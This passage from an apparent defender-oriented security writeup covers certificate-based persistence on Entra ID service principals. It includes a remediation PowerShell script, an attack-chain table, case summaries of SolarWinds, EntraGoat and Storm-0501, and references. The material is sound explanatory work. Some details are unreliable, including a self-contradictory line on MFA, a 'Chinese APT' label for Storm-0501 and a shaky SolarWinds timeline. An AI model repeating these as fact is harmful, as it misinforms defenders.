| where TimeGenerated > ago(7d)
| summarize CallCount=count(), FirstAccess=min(TimeGenerated), LastAccess=max(TimeGenerated) by ResourceDisplayName, AppDisplayName
| sort by CallCount desc
"@

# Execute in Sentinel to identify which resources were accessed
```

---

#### 5. Remediate Privilege Escalation

**Objective:** Remove any roles or permissions assigned to the compromised service principal.

```powershell
# Remove directory roles
$servicePrincipal = Get-MgServicePrincipal -Filter "displayName eq 'Compromised-App'"

$roleAssignments = Get-MgRoleManagementDirectoryRoleAssignment -Filter "principalId eq '$($servicePrincipal.Id)'"

foreach ($assignment in $roleAssignments) {
    Remove-MgRoleManagementDirectoryRoleAssignment -UnifiedRoleAssignmentId $assignment.Id
    Write-Host "Removed role assignment: $($assignment.RoleDefinitionId)"
}
```

---

## 8. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [IA-PHISH-002](../02_Initial/IA-PHISH-002_ConsentGrant.md) | OAuth consent grant phishing or password spray |
| **2** | **Privilege Escalation** | [PE-ACCTMGMT-001](../04_PrivEsc/PE-ACCTMGMT-001_AppReg.md) | Escalate to Application Administrator or Global Admin |
| **3** | **Persistence Setup** | **[PERSIST-ACCT-006]** | **Add self-signed certificate to high-permission service principal** |
| **4** | **Persistence Maintenance** | [PERSIST-ACCT-005](PERSIST-ACCT-005_GraphApp.md) | Add password secret as backup authentication method |
| **5** | **Defense Evasion** | [EVADE-IMPAIR-007](../06_Evasion/EVADE-IMPAIR-007_AuditLog.md) | Clear audit logs to hide certificate addition events |
| **6** | **Lateral Movement** | [LM-AUTH-003](../07_Lateral/LM-AUTH-003_Cloud2Cloud.md) | Use service principal to access cross-tenant resources |
| **7** | **Data Exfiltration** | [CA-TOKEN-004](../03_Cred/CA-TOKEN-004_GraphToken.md) | Use certificate-based token to exfiltrate data |

---

## 9. REAL-WORLD EXAMPLES

### Example 1: SolarWinds Compromise (APT29/NOBELIUM) – December 2020

**Target:** U.S. Government agencies, Fortune 500 companies, and Microsoft

**Timeline:**
- **October 2020:** Injected SUNBURST malware into SolarWinds Orion build process
- **December 2020:** Thousands of organizations installed compromised SolarWinds updates
- **January 2021:** Microsoft disclosed APT29 used certificate-based authentication with ADFS (Active Directory Federation Services) to maintain persistent access
- **Discovery:** January 12, 2021

**Technique Status:** ACTIVE (evolved over multiple campaigns). APT29 created malicious OAuth applications and added certificates for persistence. They obtained ADFS private keys and forged SAML tokens signed by those keys, allowing them to impersonate any user in target organizations. The certificates were valid for **years**, enabling undetected access.

**Attack Chain:**
1. SolarWinds update distributed malware (SUNBURST, SUNSPOT)
2. Malware establishes C2 communication
3. APT29 pivots to steal ADFS certificates and private keys
4. Adds rogue certificates to service principals in target cloud tenants
5. Uses certificates for **passwordless authentication** bypassing MFA
6. Maintains access for **1+ year** after initial compromise discovery

**Impact:**
- Accessed Microsoft internal systems and security research documentation
- Obtained Mimecast SSL certificates
- Accessed source code repositories
- Established persistent backdoor access independent of the SolarWinds supply chain

**Reference:**
- [Microsoft: SolarWinds Post-Incident Report](https://www.microsoft.com/security/blog/2021/03/04/solarwinds-compromise-lessons-learned/)
- [CISA: SUNBURST and SUNSPOT Malware Analysis](https://www.cisa.gov/news-events/alerts/2020/12/18/alert-aa20-352a-advanced-persistent-threat-compromise-solarwinds-orion-software)

---

### Example 2: Semperis EntraGoat Scenario 6 – Passwordless Persistence via CBA (2025)

**Target:** Simulated enterprise Entra ID environment

**Technique Status:** ACTIVE. This scenario demonstrates how attackers can:
1. Compromise legacy service principal with leaked credentials
2. Abuse service principal ownership to pivot to secondary service principal
3. Modify tenant-wide settings using `Organization.ReadWrite.All` permission
4. Enable Certificate-Based Authentication (CBA) in Entra ID
5. Upload rogue root CA certificate to tenant
6. Issue forged X.509 certificates for Global Admin accounts
7. Authenticate as Global Admin using certificate (passwordless, MFA-compliant)

**Technical Details:**
- Attacker generates RSA key pair and X.509 certificate
- Certificate is uploaded as trusted root CA in Entra ID CBA policy
- Attacker forges certificate for Global Admin with matching CN/UPN
- Authentication fails without MFA (since CBA is policy-compliant)
- Attacker gains complete tenant control

**Reference:**
- [Semperis: EntraGoat Scenario 6 – Certificate-Based Authentication Exploitation](https://www.semperis.com/blog/exploiting-certificate-based-authentication-in-entra-id/)

---

### Example 3: Storm-0501 (Chinese APT) – Multi-Tenant Federation Attack (2024-2025)

**Target:** Cloud-dependent organizations with multi-tenant setups

**Technique Status:** ACTIVE. Storm-0501 abused `Federation Trust Configuration Tampering` and certificate-based authentication to:
1. Compromise initial tenant with Global Admin access
2. Register attacker-owned Entra ID tenant as trusted federated domain
3. Upload rogue root CA certificate
4. Issue certificates for privileged accounts in victim tenant
5. Establish cross-tenant persistence

**Attack Chain:**
- Initial access via compromised credentials or phishing
- Escalation to Global Admin
- Create federated trust relationship with attacker's tenant
- Add attacker's root CA to tenant trust policy
- Issue certificates for cross-tenant authentication
- Maintain persistence across incident response efforts

**Detection:**
- Unusual "Trusted Federated Domain" registration
- New Certificate Authority additions to federation policy
- Certificate issuance events from external/new CAs

**Reference:**
- [Microsoft: Storm-0501 Cloud Ransomware Campaign](https://www.microsoft.com/en-us/security/blog/2025/08/27/storm-0501s-evolving-techniques-lead-to-cloud-based-ransomware/)

---

---

## REFERENCES & AUTHORITATIVE SOURCES

### Microsoft Official Documentation
- [Microsoft.Graph PowerShell - Add-MgServicePrincipalKey](https://learn.microsoft.com/en-us/powershell/module/microsoft.graph.applications/add-mgserviceprincipalkey)
- [Get-MgServicePrincipalKeyCredential](https://learn.microsoft.com/en-us/powershell/module/microsoft.graph.applications/get-mgserviceprincipalkeycredential)
- [Entra ID Certificate-Based Authentication](https://learn.microsoft.com/en-us/entra/identity/authentication/concept-certificate-based-authentication)
- [Azure AD Connect Certificate Requirements](https://learn.microsoft.com/en-us/azure/active-directory/hybrid/how-to-connect-install-prerequisites)
- [Audit Log Activities in Entra ID](https://learn.microsoft.com/en-us/entra/identity/monitoring-health/reference-audit-activities)

### Security Research & Analysis
- [SpecterOps: Passwordless Persistence and Privilege Escalation in Azure](https://posts.specterops.io/passwordless-persistence-and-privilege-escalation-in-azure-98a01310be3f)
- [Semperis: Exploiting Certificate-Based Authentication in Entra ID](https://www.semperis.com/blog/exploiting-certificate-based-authentication-in-entra-id/)
- [The Hacker Recipes: Shadow Credentials](https://www.thehacker.recipes/ad/movement/kerberos/shadow-credentials)
- [Elastic: Service Principal Credentials Added Detection](https://www.elastic.co/guide/en/security/8.19/microsoft-entra-id-service-principal-credentials-added-by-rare-user.html)
- [eG Innovations: Azure AD Certificate & Secret Monitoring](https://www.eginnovations.com/blog/azure-ad-app-client-secret-certificate-expirations-alerts/)

### Incident Response & Detection
- [Practical365: Detecting Midnight Blizzard Using Microsoft Sentinel](https://practical365.com/detecting-midnight-blizzard-using-microsoft-sentinel/)
- [Cloud-Architekt: Entra Workload ID Threat Detection](https://www.cloud-architekt.net/entra-workload-id-threat-detection/)
- [Tenable: First-Party Service Principal With Credentials](https://www.tenable.com/indicators/ioe/entra/FIRST-PARTY-SERVICE-PRINCIPAL-WITH-CREDENTIALS)

### Red Teaming & Proof of Concept
- [Atomic Red Team - T1098.001](https://www.atomicredteam.io/atomic-red-team/atomics/T1098.001)
- [Certify - AD CS Enumeration and Exploitation](https://github.com/ejbonachera/Certify)
- [MITRE ATT&CK - T1649 Steal or Forge Authentication Certificates](https://attack.mitre.org/techniques/T1649/)

### Compliance & Standards
- [NIST SP 800-63B - Authentication and Lifecycle Management](https://pages.nist.gov/800-63-4/sp800-63b.html)
- [ISO/IEC 27001:2022 - Cryptographic Key Management (A.10.1.2, A.9.4.5)](https://www.iso.org/standard/27001)
- [CIS Microsoft Azure Foundations Benchmark](https://www.cisecurity.org/benchmark/azure)

---